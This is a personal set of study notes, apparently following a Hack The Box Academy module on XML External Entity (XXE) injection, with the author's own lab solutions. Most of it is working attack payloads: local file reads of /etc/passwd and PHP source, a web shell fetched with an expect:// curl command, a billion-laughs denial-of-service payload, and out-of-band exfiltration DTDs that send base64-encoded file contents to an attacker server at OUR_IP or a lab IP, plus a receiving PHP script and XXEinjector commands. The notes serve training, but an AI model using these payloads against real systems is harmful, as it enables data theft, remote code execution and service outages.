# XML External Entity (XXE) Injection

| Key           | Definition                                                                                                    | Example                                  |
| ------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------- |
| `Tag`         | The keys of an XML document, usually wrapped with (`<`/`>`) characters.                                       | `<date>`                                 |
| `Entity`      | XML variables, usually wrapped with (`&`/`;`) characters.                                                     | `&lt;`                                   |
| `Element`     | The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag. | `<date>01-01-2022</date>`                |
| `Attribute`   | Optional specifications for any element that are stored in the tags, which may be used by the XML parser.     | `version="1.0"`/`encoding="UTF-8"`       |
| `Declaration` | Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.   | `<?xml version="1.0" encoding="UTF-8"?>` |

Furthermore, some characters are used as part of an XML document structure, like `<`, `>`, `&`, or `"`. So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. `&lt;`, `&gt;`, `&amp;`, `&quot;`). Finally, we can write comments in XML documents between `<!--` and `-->`, similar to HTML documents.

## Local File Disclosure

### Identifying

The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a `Contact Form`:

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

If we fill the contact form and click on `Send Data`, then intercept the HTTP request with Burp, we get the following request:

<figure><img src="../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.

If we send the form without any modification, we get the following message:

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.

For now, we know that whatever value we place in the `<email></email>` element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the `email` element to see whether it gets replaced with the value we defined.&#x20;

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

> Note: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.

Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.

> Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

### Reading Sensitive Files

Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the `SYSTEM` keyword and define the external reference path after it, as we have learned in the previous section:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

We see that we did indeed get the content of the `/etc/passwd` file, `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) module to see what attacks can be carried out through local file disclosure.

> Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

### Reading Source Code

&#x20;This would allow us to perform a `Whitebox Penetration Test` to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.

So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>

As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference.

Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using `file://` as our reference, we will use PHP's `php://filter/` wrapper. With this filter, we can specify the `convert.base64-encode` encoder as our filter, and then add an input resource (e.g. `resource=index.php`), as follows:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) module.

`This trick only works with PHP web applications.`

### Remote Code Execution with XXE

In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for `ssh` keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the `PHP://expect` filter, though this requires the PHP `expect` module to be installed and enabled.

If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as `expect://id`, and the page should print the command output.

The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands

```shell-session
eldeim@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
eldeim@htb[/htb]$ sudo python3 -m http.server 80
```

Now, we can use the following XML code to execute a `curl` command that downloads our web shell into the remote server:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

> Note: We replaced all spaces in the above XML code with `$IFS`, to avoid breaking the XML syntax. Furthermore, many other characters like `|`, `>`, and `{` may break the code, so we should avoid using them.

Once we send the request, we should receive a request on our machine for the `shell.php` file, after which we can interact with the web shell on the remote server for code execution.

> Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

### Other XXE Attacks

The [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks) module thoroughly covers SSRF, and the same techniques can be carried with XXE attacks.

Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. However, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Try it against this exercise, and see if it works.

### PoCs - Questions

* Try to read the content of the 'connection.php' file, and submit the value of the 'api\_key' as the answer

First, I intercept the peticion and see the body -->

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

I can see, it reflected me my email, so i wll be to identify el XXE

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

Nice! now I will try it give me the /connection.php file -->

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

## Advanced File Disclosure

### Advanced Exfiltration with CDATA

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

After that, if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`, so we will have to find a better way to do so.

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:

```xml
<!ENTITY joined "%begin;%file;%end;">
```

So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:

```shell-session
eldeim@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
eldeim@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Once we write our `xxe.dtd` file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the `submitDetails.php` file:

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

> Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. `Try to use this trick to read other files`.

### Error Based XXE

First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity, as follows:

<figure><img src="../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.

Now, we can call our external DTD script, and then reference the `error` entity, as follows:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts` file as follows:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.

### PoCs - Questions

* Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

First I try with a basic CDATA but it did not work ...

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> 
  <!ENTITY % file SYSTEM "file:///flag.txt"> 
  <!ENTITY % end "]]>"> 
  <!ENTITY % xxe SYSTEM "http://10.10.15.156:8000/xxe.dtd">
  %xxe;
]>
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i try an Error Based XXE, i will be to delete the heads root -->

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

NICE! it did not give us any error, so... create the "malware" -->

<pre class="language-bash"><code class="lang-bash"><strong>echo '&#x3C;!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
</strong>##
python3 -m http.server 8000
</code></pre>

Then I modified the petition to refer to my hosted dtd:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.15.156:8000/xxe.dtd">
  %xxe;
]>
<root>
<name>test</name>
<tel>12345</tel>
<email>&joined;
</email>
<message>test</message>
</root>
```

> NOTE: we refer to `&joined` which is the name of the entity on our hosted dtd

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So... It didnt work... i will try another error, i will modify the url /error/... -->

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So now I’ll try to generate a dtd, host it and then call it from the petition:

```bash
## Create exploit.dtd
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
## then
python3 -m http.server 8090
```

> NOTE: save the previous xml into a `exploit.dtd`

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.156:8000/exploit.dtd">
  %remote;
  %error;
]>

&remote;
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Blind Data Exfiltration

For such cases, we can utilize a method known as `Out-of-band (OOB) Data Exfiltration`, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) and the [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.

In our previous attacks, we utilized an `out-of-band` attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band)

### Out-of-band Data Exfiltration

To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

So, we will first write the above PHP code to `index.php`, and then start a PHP server on port `8000`, as follows:

```shell-session
eldeim@htb[/htb]$ vi index.php # here we write the above PHP code
eldeim@htb[/htb]$ php -S 0.0.0.0:8000
```

Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:

<pre class="language-xml"><code class="lang-xml"><strong>&#x3C;?xml version="1.0" encoding="UTF-8"?>
</strong><strong>&#x3C;!DOCTYPE email [ 
</strong>  &#x3C;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
&#x3C;root>&#x26;content;&#x3C;/root>
</code></pre>

Then, we can send our request to the web application:

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```

> Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

### Automated OOB Exfiltration

Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.

To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:

```shell-session
eldeim@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...
```

Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:

```shell-session
eldeim@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:
```

We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:

```shell-session
eldeim@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..
```

Try to use the tool to repeat other XXE methods we learned.

### PoCs - Questions

* Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

First, I captured the request and made one tho the `/blind` endpoint:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then I tried to perform an OOB XXE. First I created a dtd where I put the content of the file I wanted to read and apply a filter to it:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.156:8000/?content=%file;'>">
```

Then I saved it into `oob_xxe.dtd`. Afterwards I created a simple php script that automatically decodes any data I receive into the port `8000`:

```
<?phpif(isset($_GET['content'])){    error_log("\n\n" . base64_decode($_GET['content']));}?>
```

I saved it into `index.php`. Then I started a php server it with:

```
php -S 0.0.0.0:8000
```

Now i modified the petition to call the external entity and forward the output to my php server:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [   <!ENTITY % remote SYSTEM "http://10.10.15.156:8000/oob_xxe.dtd">  %remote;  %oob;]><root>&content;</root>
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
